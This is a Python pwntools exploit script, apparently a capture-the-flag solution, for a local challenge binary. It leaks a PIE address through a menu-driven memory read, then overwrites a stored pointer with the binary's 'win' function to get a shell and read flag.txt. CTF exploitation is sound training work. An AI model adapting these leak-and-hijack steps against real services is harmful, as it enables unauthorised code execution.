#!/usr/bin/env python3
from pwn import *

PORT = 23335
HOST = "127.0.0.1"
elf = context.binary = ELF('./pwnable_2_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            brva 0x00000000000019D3
            brva 0x0000000000001C16
            brva 0x0000000000001EB7
            brva 0x0000000000001D6E
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def sla(pr, data):
    p.sendlineafter(pr, data)

def menu(opt):
    sla(b'\n', str(opt).encode())

def add_menu_cmd(opt, data=b'A', idx=None):
    sla(b'\n', str(opt).encode())

    if opt == 4:
        sla(b'(start 0): ', str(idx).encode())
        sla(b'edit: ', data)
    elif opt in [1, 2, 3]:
        sla(b'readfile c.txt) : ', data)

def enter_add_menu():
    menu(1)

def exit_add_menu():
    sla(b'\n', b'5')

def get(idx):
    menu(2)
    sla(b'start = 0): ', str(idx).encode())

def submit():
    menu(3)

def add_console():
    menu(4)

def chose_console(idx):
    menu(5)
    sla(b'start 0) : ', str(idx).encode())

# Stage 1: Leak PIE base
enter_add_menu()

for _ in range(9):
    add_menu_cmd(3, b'X'*8)

add_menu_cmd(1, b'A'*8)
# GDB()
add_menu_cmd(3, b'B'*8)
exit_add_menu()

for slot in range(1, 16):
    add_console()
    chose_console(slot)
    enter_add_menu()

    for _ in range(7):
        add_menu_cmd(3, b'G'*8)

    exit_add_menu()

chose_console(0)
enter_add_menu()
add_menu_cmd(1, b'C'*8)
add_menu_cmd(3, b'D'*8)
exit_add_menu()

get(12)
leak = p.recvn(0x20)
PIE_leak = u64(leak[0x10:0x18])
elf.address = PIE_leak - 0x13f5
log.info(f'PIE_leak: {hex(PIE_leak)}')
log.info(f'PIE_base: {hex(elf.address)}')


# Stage 2: Get Shell

chose_console(0)
enter_add_menu()

pl = flat(b'A'*0x10, elf.sym.win)

add_menu_cmd(4, pl, idx=12)
exit_add_menu()

chose_console(13)
submit()

p.sendline(b'cat flag.txt')
p.interactive()